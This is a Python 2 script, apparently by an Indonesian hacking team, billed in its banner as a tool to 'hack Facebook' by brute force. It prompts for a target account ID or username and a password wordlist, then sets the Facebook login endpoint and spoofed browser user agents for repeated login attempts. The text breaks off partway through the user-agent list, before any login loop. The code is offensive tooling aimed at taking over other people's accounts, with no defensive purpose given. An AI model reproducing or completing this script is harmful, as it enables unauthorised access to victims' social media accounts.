#!usr
# -*- coding: UTF-8 -*-
# Mod by: MR.K7C8NG
# team: life of programmer


import os
import sys
import time
import random
import cookielib
import mechanize

wd = "\033[90;1m" # dark
GL = "\033[96;1m" # Blue aqua
BB = "\033[34;1m" # Blue light
YY = "\033[33;1m" # Yellow light
GG = "\033[32;1m" # Green light
WW = "\033[0;1m"  # White light
RR = "\033[31;1m" # Red light
CC = "\033[36;1m" # Cyan light
B = "\033[34m"    # Blue
Y = "\033[33;1m"    # Yellow
G = "\033[32m"    # Green
W = "\033[0;1m"     # White
R = "\033[31m"    # Red
C = "\033[36;1m"    # Cyan

def runntxt(s):
        for noobs in s + '\n':
                sys.stdout.write(noobs)
                sys.stdout.flush()
                time.sleep(10. / 2100)


def banner():
    os.system('clear')
    print " "
    runntxt(GL+"              Assalamu'@laikum. ^_^")
    runntxt(WW+"   ..................  ANDA MENCOBA MENGHUBUNGI")
    runntxt(WW+"     ....       MR.K7C8NG")
    runntxt(GL+"                   BODO AMAT CUK")
    runntxt(GG+"     ..........     MANDI DULU SANA")
    runntxt(Y+"    ............       DILARANG CO*I")
    runntxt(GG+"           INGAT COK ")
    time.sleep(1.5)
    print GG+"  √=============================================√"
    print GL+"  |••••••   NEW TOOLS HACK FACEBOOK BF.   ••••••|"
    print GG+"  √=============================================√"
    print WW+"  |            MOD BY: MR.K7C8NG             |"
    print GL+"  |       Berdoa Dulu Sebelum Menggunakan       |"
    print WW+"  |        TEAM : InDoNeSiA CYBER ErRoR SyStEm            |"
    print Y+"  |             INSTAGRAM: pranata_pasha              |"
    print GL+"  |---------------------------------------------|"
    print GL+"  |        LIFE OF PROGRAMMER [ L.O.P ]         |"
    print GL+"  |---------------------------------------------|"
    print GG+"  √=============================================√"
    print GL+"  |•••••••••   HACK FACEBOOK MAS ^_^   •••••••••|"
    print GG+"  √=============================================√"

banner()

print wd+"         gunakan dengan bijak cok "
print GG+"╭────\033[91m[\033[96m Masukkan ID\033[95m / \033[96mUsername Target\033[91m ] "
email_target = str(raw_input(GL+"\033[92m╰────➲\033[93m  "))
print " "
print "\033[92m╭────\033[91m[ \033[96mMasukkan File Wordlist \033[95m( pass.txt ) \033[91;1m]"
password_list = str(raw_input(GG+"╰────➲\033[93m "))
login = 'https://www.facebook.com/login.php?login_attempt=1'
useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck')]
# useragents = [('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (Windows NT 6
